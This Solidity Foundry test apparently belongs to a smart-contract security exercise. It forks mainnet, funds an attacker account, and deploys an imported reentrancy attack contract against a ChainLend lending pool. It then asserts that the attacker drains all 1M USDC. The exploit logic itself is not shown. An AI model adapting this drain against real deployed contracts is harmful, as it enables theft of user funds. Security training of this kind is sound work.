// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/reentrancy-3/AttackChainLend.sol";
import "../../src/reentrancy-3/ChainLend.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
@dev run "forge test --fork-url $ETH_RPC_URL --fork-block-number 15969633 --match-contract RE3 -vvv" 
*/
contract TestRE3 is Test {
    address constant imBTC_ADDRESS = address(0x3212b29E33587A00FB1C83346f5dBFA69A458923);
    address constant USDC_ADDRESS = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address constant imBTC_WHALE = address(0xFEa4224Da399F672eB21a9F3F7324cEF1d7a965C);
    address constant USDC_WHALE = address(0xF977814e90dA44bFA03b6295A0616a897441aceC);

    //1 million with 6 decimals
    uint256 constant USDC_IN_CHAINLEND = 1e12;

    uint256 init_attacker_bal;
    uint256 init_bank_bal;

    ChainLend chainLend;
    AttackChainLend attackChainLend;

    IERC20 imBTC = IERC20(imBTC_ADDRESS);
    IERC20 usdc = IERC20(USDC_ADDRESS);

    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(1);
        attacker = address(5);
        // Fund deployer & attacker with 100 ETH
        vm.deal(deployer, 100 ether);
        vm.deal(attacker, 100 ether);

        // Send some ETH for whales for tx fees
        vm.prank(deployer);
        imBTC_WHALE.call{value: 2 ether}("");
        USDC_WHALE.call{value: 2 ether}("");

        // ChainLend deployment
        vm.prank(deployer);
        chainLend = new ChainLend(imBTC_ADDRESS, USDC_ADDRESS);

        // Impersonate imBTC Whale and send 1 imBTC to attacker
        vm.prank(imBTC_WHALE);
        imBTC.transfer(attacker, 1e8);

        // Impersonate USDC Whale and send 1M USDC to ChainLend
        vm.prank(USDC_WHALE);
        usdc.transfer(address(chainLend), USDC_IN_CHAINLEND);
    }

    function test_Attack() public {
        vm.startPrank(attacker);
        attackChainLend = new AttackChainLend(imBTC_ADDRESS, USDC_ADDRESS, address(chainLend));
        imBTC.transfer(address(attackChainLend), 1e8);
        attackChainLend.attack();
        vm.stopPrank();

        assertEq(usdc.balanceOf(attacker), USDC_IN_CHAINLEND);
    }
}
